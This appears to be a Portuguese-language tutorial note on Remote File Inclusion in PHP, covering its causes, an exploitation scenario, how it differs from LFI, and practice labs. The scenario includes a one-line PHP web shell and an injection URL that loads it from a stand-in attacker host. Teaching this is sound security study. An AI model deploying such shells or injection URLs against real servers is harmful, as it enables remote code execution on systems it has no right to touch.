# Remote File Inclusion (RFI)
## A falha de RFI permite que um atacante force o servidor a carregar e executar um arquivo malicioso hospedado em um servidor externo.
O RFI ocorre quando uma aplicação web permite a inclusão de arquivos externos através de funções que deveriam apenas ler arquivos locais. Isso geralmente acontece em linguagens de script como PHP, onde funções como include(), require(), include_once() e require_once() aceitam URLs como entrada sem a devida sanitização.  

### Cenários de Ataque
O RFI surge devido a uma falha na lógica de programação e em configurações do servidor:
* Entrada de Usuário Insegura: A aplicação usa um parâmetro (como ?page= ou ?lang=) para decidir qual arquivo carregar.
* Configuração do PHP: No caso do PHP, a diretiva allow_url_include deve estar configurada como On (o que é raro em servidores modernos, mas ainda acontece em sistemas legados).
* Falta de Validação: O código não verifica se o caminho fornecido é um arquivo local ou uma URL externa.

### Exploração
O objetivo principal dessa falha é obter um Remote Code Execution (RCE). Para isso, veja o seguinte cenário:
1. O atacante hospeda um script PHP malicioso em seu próprio site, como `http://atacante.com/shell.txt`  
   Exemplo do script:
   ```php
   <?php echo shell_exec($_GET['cmd']); ?>
   ```

2. O atacante busca pelo parâmetro vulnerável da página, por exemplo, `http://vulneravel.com/index.php?page=`, e injeta a URL de seu site no parâmetro, ficando assim:
   `http://vulneravel.com/index.php?page=http://atacante.com/shell.txt`
3. Dessa forma, o servidor baixa o código do atacante e lhe dá a brecha de um RCE.

### RFI x LFI
Por mais que sejam parecidas, não confunda:
* **LFI**: O atacante inclui arquivos que já existem no servidor da vítima (ex: /etc/passwd).
* **RFI**: O atacante inclui arquivos de um servidor externo controlado por ele.

### Exemplos práticos
Para colocar os conhecimentos em prática, acesse os seguintes laboratórios:  
* [Damn Vulnerable Web Application](https://github.com/digininja/DVWA)
* [TryHackMe](https://tryhackme.com/room/fileinc)
* [Hack The Box]()
